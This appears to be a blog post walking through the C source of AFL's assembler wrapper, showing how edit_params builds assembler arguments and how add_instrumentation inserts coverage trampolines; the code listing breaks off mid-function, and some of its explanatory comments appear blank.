class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  u8 *tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_AS&quot;</span>);</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line"></span><br><span class="line">    use_clang_as = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//  tmp </span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="built_in">getenv</span>(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params = <span class="built_in">ck_alloc</span>((argc + <span class="number">32</span>) * <span class="built_in">sizeof</span>(u8*));</span><br><span class="line"></span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="comment">// 64/32</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line"></span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line">  <span class="comment">// -version</span></span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) <span class="built_in">FATAL</span>(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tmp AFL_KEEP_ASSEMBLY </span></span><br><span class="line">  modified_file = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, <span class="built_in">getpid</span>(),</span><br><span class="line">                               (u32)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">wrap_things_up:</span><br><span class="line">  <span class="comment">// /tmp/.afl-xxx.S </span></span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h3><p>afl-gcc<code>AFL_KEEP_ASSEMBLY</code>IDA</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = <span class="built_in">fopen</span>(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = stdin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// modified_file     /tmp/.afl-xxx.s </span></span><br><span class="line">  outfd = <span class="built_in">open</span>(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = <span class="built_in">fdopen</span>(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) <span class="built_in">PFATAL</span>(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(line, MAX_LINE, inf)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class="line"><span class="comment">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class="line"><span class="comment">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class="line"><span class="comment">       the trampoline now. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        instr_ok: , eg:  .text</span></span><br><span class="line"><span class="comment">        skip_csect: code section</span></span><br><span class="line"><span class="comment">        skip_next_label: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        skip_intel: intel, afl-asintel, </span></span><br><span class="line"><span class="comment">        skip_app: , afl-as, </span></span><br><span class="line"><span class="comment">        instrument_next: , .</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">        instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">              <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">      instrument_next = <span class="number">0</span>;</span><br><span class="line">      ins_lines++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output the actual line, call it a day in pass-thru mode. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fputs</span>(line, outf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">       files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">         a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">         around them, so we use that as a signal. */</span></span><br><span class="line">      <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">          <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">continue</span>; </span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">          !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">        instr_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span></span><br><span class="line"><span class="comment">       encountered, we set skip_csect until the opposite directive is</span></span><br><span class="line"><span class="comment">       seen, and we do not instrument. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x86x64</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect syntax changes, as could happen with hand-written assembly.</span></span><br><span class="line"><span class="comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// intelAT&amp;Tintel</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span></span><br><span class="line"><span class="comment">       names or conditional labels. This is a bit messy, but in essence,</span></span><br><span class="line"><span class="comment">       we want to catch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^main:      - function entry point (always instrumented)</span></span><br><span class="line"><span class="comment">         ^.L0:       - GCC branch label</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span></span><br><span class="line"><span class="comment">         ^\tjnz foo  - conditional branches</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       ...but not:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         ^# BB#0:    - clang comments</span></span><br><span class="line"><span class="comment">         ^ # BB#0:   - ditto</span></span><br><span class="line"><span class="comment">         ^.Ltmp0:    - clang non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LC0       - GCC non-branch labels</span></span><br><span class="line"><span class="comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span></span><br><span class="line"><span class="comment">         ^\tjmp foo  - non-conditional jumps</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       Additionally, clang and GCC on MacOS X follow a different convention</span></span><br><span class="line"><span class="comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span></span><br><span class="line"><span class="comment">       later on.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||</span><br><span class="line">        line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span></span><br><span class="line"><span class="comment">       right after the branch (to instrument the not-taken path) and at the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="comment">// jump</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 